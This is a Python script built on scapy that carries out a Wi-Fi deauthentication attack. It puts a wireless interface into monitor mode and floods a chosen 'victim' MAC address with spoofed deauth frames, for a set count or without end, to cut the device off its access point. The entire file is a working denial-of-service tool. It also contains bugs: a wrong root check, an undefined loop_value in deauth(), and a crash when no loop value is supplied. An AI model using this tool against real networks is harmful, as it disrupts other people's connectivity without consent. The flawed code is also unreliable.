#!/usr/bin/env python3
from scapy.all import *
from argparse import ArgumentParser as AP
import sys

def check_interface(iface):
    if os.geteuid()==1:
        print("[!] Deauthenticator must be run as root\n")
        exit(-1)
    os.system("sudo ifconfig "+iface+" down")
    if os.system("sudo iwconfig "+iface+" mode monitor") == 0:
        os.system("sudo iwconfig "+iface)
        os.system("sudo ifconfig "+iface+" up")
    else:
        print("Interface does not support monitor mode \n")
        os.system("sudo ifconfig "+iface+" up")

def deauth(iface, count , bssid, target_mac):
    check_interface(iface)
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth()
    sendp(frame, iface=iface, count=count, inter=0.100,loop=loop_value)

def inf_deauth(iface,bssid,target_mac,loop_value):
    check_interface(iface)
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth()
    sendp(frame, iface=iface,inter=0.001,loop=loop_value)

if __name__ == "__main__":
    parser = AP(description="Perform Deauthentication attack against a computer")
    parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
    parser.add_argument("-c", "--count",help="The number of deauthentication packets to send to the victim computer")
    parser.add_argument("-l", "--loop",help="To send infinite deauthentication packets set it to 1  (can only be stopped using Ctrl+C) ")
    parser.add_argument("-a", "--bssid",metavar="MAC",help="the MAC address of the access point (Airodump-ng BSSID)")
    parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")
    args = parser.parse_args()
    if (not args.interface or not args.bssid or not args.target_mac ):
        print("[-] Please specify all program arguments... run `sudo python3 deauthenticator.py -h` for help")
        exit(1)
    if (not args.count):
        inf_deauth(args.interface,args.bssid, args.target_mac,int(args.loop))
    else:
        deauth(args.interface,int(args.count),args.bssid,args.target_mac)


